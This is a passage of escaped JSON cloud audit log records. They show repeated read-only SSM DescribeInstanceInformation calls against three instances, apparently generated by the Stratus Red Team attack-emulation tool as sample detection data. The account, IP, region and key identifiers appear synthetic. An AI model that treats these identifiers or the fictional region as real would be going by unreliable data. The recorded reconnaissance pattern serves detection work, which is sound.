\"eventTime\": \"2024-08-01T12:19:16Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"c98780a2-d6a4-4114-91b0-a28a2a0842b3\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"5ccb707e-ea1c-4ae5-acb1-2039ca8908ec\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:15Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"089ef7a1-3dd7-4b8c-a59d-d169df9b4316\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"75d83a2a-99a3-4808-ade4-fe692446096b\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:14Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"9d1129f2-f619-4690-bab2-b097875b913f\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"9a3b3ce3-c139-46e2-be9b-920f6c670c42\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:12Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"45eb28df-eda5-4b72-8e11-3b37679681a0\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"b8a73842-fae3-40a9-85b3-515a1a07d582\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:11Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"cb435a50-9023-4ded-a904-6f448738ee31\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"554070cc-5bc1-4894-9880-c75a15ac78a2\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:10Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"8eb080f2-3c5d-447c-bad2-d4ceebe8bfd2\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"6844ea57-f22c-42e1-ae5b-709d8fc2c36b\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:09Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"84c1b5d3-c365-469c-917b-cc317aed7d43\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"913f3327-0ef4-4acb-a3a2-325ddcbda947\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:08Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"1b58a0d1-b841-4234-ad41-25faee08b985\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"b045bced-b93a-4e6c-a1b8-2011fe92b93a\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:06Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"ab3f6858-2db0-413f-9b21-09997a048505\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"0f520fea-16a0-459f-bf72-21efd8457cb1\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:05Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"6ca20f16-71aa-4794-8884-36989a3b7bc6\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"9546b899-0954-4c25-bbfb-a588f2a072c6\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:04Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"ec65f81b-3145-4abd-a992-1de519835cad\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"4ddacdbc-fba5-4298-9f8d-90b7ab937844\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:03Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"270fe471-7761-411c-a5c8-8aef5d50b090\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"26e75a55-97b5-4ec0-a061-74460a26659d\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:02Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"9f172d90-39e1-46ba-9271-e18d349f22ff\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"f25d2e8c-bf82-4cb5-9a80-a72bd83d85cf\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:19:01Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"0d98546c-6b0b-4d0c-a73c-68059eb76792\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"fd5300fb-d315-4ed3-b9e7-ca1b92a5d394\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:18:59Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"44bae06a-b763-4952-8832-41fc6ad7302c\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"22af1364-f2e4-41eb-bb18-f1738e807acf\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:18:58Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"af97f2a9-e028-4735-a6c6-9124b6679d5d\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"12794adb-6096-4389-9756-e98a5dca6d67\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:18:57Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"b3335448-07b5-4095-982d-b1b34a832ec5\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"19e72b5f-adba-48cc-ab37-53756ed926d5\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:18:56Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"a057578e-d65b-43a5-bb03-9914d7e1d069\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-d3720C7af6fCfF2B2\",\n                  \"i-d0b6DCBA8984dE148\",\n                  \"i-eA1d1296c1dE3Aa1f\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"254.222.242.236\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.me-northwest-3r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_ae66c4b1-50c7-490d-b027-3a699952bd6a\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIA4HNRH6OJUWNZ893Z\",\n         \"accountId\": \"294599468799\",\n         \"arn\": \"arn:aws:iam::294599468799:user/christophe\",\n         \"principalId\": \"AIDAH36QPLPPPZVXSD3V\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"me-northwest-3r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"a5578e6e-e935-4b5f-9d9e-7af60f7999e4\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-01T12:18:54Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"294599468799\",\n      \"requestID\": \"8ea8e04e-b423-4651-878a-c81a60213c16\",\n      